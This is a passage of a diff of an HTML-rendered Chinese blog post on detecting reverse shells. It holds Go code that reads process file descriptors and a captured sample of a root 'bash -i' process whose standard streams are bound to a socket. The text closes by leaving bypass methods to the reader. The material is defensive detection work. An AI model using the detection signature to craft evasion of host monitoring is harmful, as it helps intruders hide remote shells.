 <span class="w">    </span>m<span class="w"> </span>:<span class="o">=</span><span class="w"> </span><span class="o">[]</span>string<span class="o">{}</span>
@@ -469,12 +447,12 @@ func<span class="w"> </span>getfd<span class="o">(</span>pid<span class="w"> </s
 <span class="w">        </span><span class="k">if</span><span class="w"> </span>err<span class="w"> </span>!<span class="o">=</span><span class="w"> </span>nil<span class="w"> </span><span class="o">{</span>
 <span class="w">            </span><span class="k">continue</span>
 <span class="w">        </span><span class="o">}</span>
-<span class="w">        </span>countSplit<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.Split<span class="o">(</span>v,<span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="o">)</span>
-<span class="w">        </span><span class="nv">m</span><span class="o">=</span>append<span class="o">(</span>m,strings.Join<span class="o">(</span>countSplit<span class="o">[</span><span class="m">3</span>:<span class="o">]</span>,<span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="o">)</span>+<span class="s2">&quot;---&quot;</span>+fileInfo<span class="o">)</span>
+<span class="w">        </span>countSplit<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>strings.Split<span class="o">(</span>v,<span class="w"> </span><span class="s2">"/"</span><span class="o">)</span>
+<span class="w">        </span><span class="nv">m</span><span class="o">=</span>append<span class="o">(</span>m,strings.Join<span class="o">(</span>countSplit<span class="o">[</span><span class="m">3</span>:<span class="o">]</span>,<span class="w"> </span><span class="s2">"/"</span><span class="o">)</span>+<span class="s2">"---"</span>+fileInfo<span class="o">)</span>
 
 <span class="w">    </span><span class="o">}</span>
 
-<span class="w">    </span><span class="k">return</span><span class="w"> </span>strings.Join<span class="o">(</span>m,<span class="w"> </span><span class="s2">&quot; &quot;</span><span class="o">)</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span>strings.Join<span class="o">(</span>m,<span class="w"> </span><span class="s2">" "</span><span class="o">)</span>
 <span class="o">}</span>
 
 func<span class="w"> </span>dirsFile<span class="o">(</span>dirPath<span class="w"> </span>string<span class="o">)</span><span class="w"> </span><span class="o">([]</span>string,<span class="w"> </span>error<span class="o">)</span><span class="w"> </span><span class="o">{</span>
@@ -489,40 +467,38 @@ func<span class="w"> </span>dirsFile<span class="o">(</span>dirPath<span class="
 <span class="w">    </span>ret<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>make<span class="o">([]</span>string,<span class="w"> </span><span class="m">0</span>,<span class="w"> </span>sz<span class="o">)</span>
 <span class="w">    </span><span class="k">for</span><span class="w"> </span>i<span class="w"> </span>:<span class="o">=</span><span class="w"> </span><span class="m">0</span><span class="p">;</span><span class="w"> </span>i<span class="w"> </span>&lt;<span class="w"> </span>sz<span class="p">;</span><span class="w"> </span>i++<span class="w"> </span><span class="o">{</span>
 <span class="w">        </span><span class="k">if</span><span class="w"> </span>!fs<span class="o">[</span>i<span class="o">]</span>.IsDir<span class="o">()</span><span class="w"> </span><span class="o">{</span>
-<span class="w">            </span>name<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>dirPath<span class="w"> </span>+<span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="w"> </span>+<span class="w"> </span>fs<span class="o">[</span>i<span class="o">]</span>.Name<span class="o">()</span>
+<span class="w">            </span>name<span class="w"> </span>:<span class="o">=</span><span class="w"> </span>dirPath<span class="w"> </span>+<span class="w"> </span><span class="s2">"/"</span><span class="w"> </span>+<span class="w"> </span>fs<span class="o">[</span>i<span class="o">]</span>.Name<span class="o">()</span>
 <span class="w">            </span><span class="nv">ret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>append<span class="o">(</span>ret,<span class="w"> </span>name<span class="o">)</span>
 <span class="w">        </span><span class="o">}</span>
 <span class="w">    </span><span class="o">}</span>
 <span class="w">    </span><span class="k">return</span><span class="w"> </span>ret,<span class="w"> </span>nil
 <span class="o">}</span>
 </code></pre></div>
-
 <p>抓取的数据如下</p>
 <div class="highlight"><pre><span></span><code><span class="o">{</span>
-<span class="w">    </span><span class="s2">&quot;command&quot;</span>:<span class="s2">&quot;bash -i&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;egid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;euid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;fd&quot;</span>:<span class="s2">&quot;fd/0---socket:[27215273] fd/1---socket:[27215273] fd/2---socket:[27215273] fd/255---/dev/tty&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;fsgid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;fsuid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;gid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;name&quot;</span>:<span class="s2">&quot;bash&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;pegid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;peuid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;pfsgid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;pfsuid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;pgid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;pid&quot;</span>:<span class="s2">&quot;23923&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;ppid&quot;</span>:<span class="s2">&quot;23592&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;psgid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;psuid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;puid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;sgid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;suid&quot;</span>:<span class="s2">&quot;0&quot;</span>,
-<span class="w">    </span><span class="s2">&quot;uid&quot;</span>:<span class="s2">&quot;0&quot;</span>
+<span class="w">    </span><span class="s2">"command"</span>:<span class="s2">"bash -i"</span>,
+<span class="w">    </span><span class="s2">"egid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"euid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"fd"</span>:<span class="s2">"fd/0---socket:[27215273] fd/1---socket:[27215273] fd/2---socket:[27215273] fd/255---/dev/tty"</span>,
+<span class="w">    </span><span class="s2">"fsgid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"fsuid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"gid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"name"</span>:<span class="s2">"bash"</span>,
+<span class="w">    </span><span class="s2">"pegid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"peuid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"pfsgid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"pfsuid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"pgid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"pid"</span>:<span class="s2">"23923"</span>,
+<span class="w">    </span><span class="s2">"ppid"</span>:<span class="s2">"23592"</span>,
+<span class="w">    </span><span class="s2">"psgid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"psuid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"puid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"sgid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"suid"</span>:<span class="s2">"0"</span>,
+<span class="w">    </span><span class="s2">"uid"</span>:<span class="s2">"0"</span>
 <span class="o">}</span>
 </code></pre></div>
-
 <p>对应上面的规则，在server 端做流式分析，很多东西一目了然，不过， 百密总有一疏，绕过的方法大家自主了解，技术在对抗中升华。</p>
   </div>
 </article>
